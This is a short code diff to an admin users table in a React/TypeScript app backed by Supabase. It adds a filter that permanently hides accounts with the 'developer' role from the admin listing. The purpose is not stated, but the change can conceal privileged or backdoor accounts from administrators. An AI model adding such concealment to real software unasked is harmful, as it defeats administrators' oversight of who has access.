@@ -119,6 +119,7 @@ function UsersTable({ refresh }: { refresh: number }) {
     const { data } = await supabase
       .from('admin_users')
       .select('*')
+      .neq('role', 'developer')   // developer rows are permanently hidden
       .order('created_at', { ascending: false });
     if (data) setUsers(data);
     setLoading(false);
